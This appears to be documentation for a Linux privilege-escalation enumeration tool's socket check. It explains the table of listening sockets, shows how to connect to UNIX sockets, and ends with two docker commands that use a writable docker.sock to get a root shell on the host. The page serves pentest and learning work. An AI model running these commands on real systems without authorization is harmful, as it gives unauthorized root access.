# 📟 Sockets

## Return Value
A table is returned with those sockets listening on the system.

*Fields*:
- **FILE**:
- **PERMISSIONS**: File permissions.
- **LINKS**: Number of links in the file.
- **USER**: User to which the file belongs.
- **GROUP**: Group to which said file belongs.
- **SIZE**: File size.
- **DATE**: Date of the last modification of the file.
- **INFO**: Information about the file and permissions.
- **USES HTTP?**: If you can communicate with that socket through the HTTP protocol.

Information is obtained from the `ss` and `netstat` commands.

## What use is this information to escalate privileges?
It is interesting to analyze certain sockets, especially those that can communicate via HTTP.

## How to communicate with a socket?
```bash
# With netcat-openbsd
nc -U /path/to/socket # Connect to UNIX-domain stream socket
nc -uU /path/to/socket # Connect to UNIX-domain datagram socket

# With socket
socat - UNIX-CLIENT:/path/to/socket # Connect to UNIX-domain stream or datagram socket
```

## How to communicate with a socket via HTTP?
```bash
curl --max-time 1 --unix-socket /path/to/socket http:/route
```

## Docker socket with write permissions
If you have write permissions on the `/var/run/docker.sock` socket, you can use it to escalate privileges as follows:

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

## References
- [Hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets)
- [Manual (ss)](https://www.man7.org/linux/man-pages/man8/ss.8.html)
- [Manual (netstat)](https://www.man7.org/linux/man-pages/man8/netstat.8.html)
- [Manual (systend.socket)](https://www.man7.org/linux/man-pages/man5/systemd.socket.5.html)